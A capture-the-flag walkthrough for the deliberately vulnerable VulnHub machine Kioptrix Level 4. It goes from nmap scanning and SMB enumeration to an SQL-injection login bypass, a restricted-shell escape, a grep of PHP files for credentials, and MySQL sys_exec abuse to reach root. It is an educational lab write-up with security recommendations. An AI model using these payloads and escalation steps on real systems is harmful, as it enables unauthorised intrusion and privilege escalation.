---
title: "Kioptrix Level 4"
tagline: "From reconnaissance to root via SQL injection, restricted-shell escape, and MySQL sys_exec abuse."
category: CTF
difficulty: Intermediate
platform: VulnHub
date: 2026-01-10
---

## 📋 Overview
This guide documents the complete penetration testing methodology for Kioptrix Level 4, detailing every step from initial reconnaissance to privilege escalation and flag capture.

## 🎯 Objectives
- Identify the target system and open services
- Enumerate users and services
- Exploit vulnerabilities to gain initial access
- Escalate privileges to obtain root access
- Capture the flag

## 1. Reconnaissance

### Network Discovery
Check the IP allocated to the attacking machine and determine the subnet range.

```bash
$ ifconfig
```

<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-4-Walkthrough/main/Screenshots/A.%20IFCONFIG.PNG" alt="ifconfig output"></p>

### Host Discovery
Ping sweep to identify live hosts within the subnet.

```bash
$ nmap -sn 192.168.56.1/24
```

<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-4-Walkthrough/main/Screenshots/B.%20NMAP.PNG" alt="Nmap host discovery"></p>

### Port Scan
Scan all ports (0–65000). The `-A` flag enables aggressive mode, bundling OS and service detection.

```bash
$ nmap -p 0-65000 -A 192.168.56.15
```

<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-4-Walkthrough/main/Screenshots/C.%20Nmap%20port%20scan..PNG" alt="Nmap port scan"></p>

**Findings:** Ports **22** (SSH), **80** (HTTP), **139** (SMB), and **445** (SMB) are open.

## 2. Enumeration

Navigate to port 80: `http://192.168.56.15:80`. A login page appears with an authentication form requiring a username and password.

### SMB Enumeration

```bash
$ enum4linux 192.168.56.15
```

<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-4-Walkthrough/main/Screenshots/D.%20Enum4linux..PNG" alt="enum4linux output"></p>

Discovered users:

| RID | Username |
|-----|----------|
| 0x1f5 | nobody |
| 0xbbc | robert |
| 0x3e8 | root |
| 0xbba | john |
| 0xbb8 | loneferret |

## 3. Initial Access via SQL Injection

**Target:** `http://192.168.56.10`

| Field | Value |
|-------|-------|
| Username | `john` |
| Password | `' OR 1=1#` |

**Result:** Successful auth bypass, revealing John's password: **`MyNameIsJohn`**

<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-4-Walkthrough/main/Screenshots/E.%20Webpage..PNG" alt="SQLi auth bypass result"></p>

## 4. Gaining Shell Access

```bash
$ ssh -p 22 john@192.168.56.15 -oHostKeyAlgorithms=+ssh-rsa
```

Type `yes` to accept the host key, enter password `MyNameIsJohn`.

<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-4-Walkthrough/main/Screenshots/F.%20Escal1.PNG" alt="SSH login"></p>

### Restricted Shell Escape
```bash
john:~$ ?
```
`echo` is available — use it to spawn a full shell:
```bash
john:~$ echo os.system('/bin/bash')
```
The prompt changes from `john:~$` to `john@Kioptrix4:~$`.

## 5. Privilege Escalation

### Information Gathering
```bash
john@Kioptrix4:~$ find / -maxdepth 5 -name *.php -type f -exec grep -Hn password {} \; 2>/dev/null
```

A MySQL root account with a **blank password** is found.

### MySQL Exploitation
```bash
john@Kioptrix4:~$ mysql -u root
mysql> select * from mysql.func;
```

A critical function, **`sys_exec`**, allows arbitrary system command execution.

### Group Escalation
```sql
mysql> select sys_exec('usermod -a -G admin john');
mysql> quit
```

### Final Privilege Escalation
```bash
john@Kioptrix4:~$ sudo su
```
Password: `MyNameIsJohn`. Prompt changes to `root@Kioptrix4:/home/john#`.

```bash
root@Kioptrix4:/home/john# cd /root
root@Kioptrix4:~# cat congrats.txt
```

<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-4-Walkthrough/main/Screenshots/I.%20CONGRATS..PNG" alt="Root flag captured"></p>

🎉 **Root access achieved — flag captured!**

## 🔒 Security Recommendations
- **Input Validation** — sanitize input to prevent SQL injection
- **Password Policies** — enforce strong password requirements
- **Service Hardening** — disable unnecessary services and ports
- **Privilege Separation** — limit MySQL functions and user privileges
- **Regular Updates** — keep software patched
- **Log Monitoring** — implement logging and alerting

## 🔧 Tools Used
`ifconfig` · `nmap` · `enum4linux` · Manual SQL Injection · `ssh` · `mysql` · `find` · `grep` · `sudo` · `usermod`
